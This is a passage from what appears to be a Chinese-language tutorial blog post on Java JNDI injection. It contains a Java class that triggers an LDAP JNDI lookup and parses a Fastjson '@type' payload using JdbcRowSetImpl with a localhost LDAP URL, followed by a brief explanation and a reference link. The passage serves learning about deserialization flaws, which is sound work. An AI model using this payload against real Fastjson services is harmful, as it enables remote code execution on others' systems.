import com.alibaba.fastjson.JSON;    
    
import javax.naming.Context;    
import javax.naming.InitialContext;    
    
public class JNDIGadgetClient {    
    public static void main(String[] args) throws Exception {    
        // lookup参数注入触发    
 Context context = new InitialContext();    
 context.lookup("ldap://localhost:1234/ExportObject");    
    
 // Fastjson反序列化JNDI注入Gadget触发    
 String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";    
 JSON.parse(payload);    
 }    
}
```
其实是换了一种思路进行字节码的加载，通过 `deserializeObject()` 方法的反序列化来进行命令执行。


参考：
[Java反序列化之JNDI学习 | Drunkbaby's Blog](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/)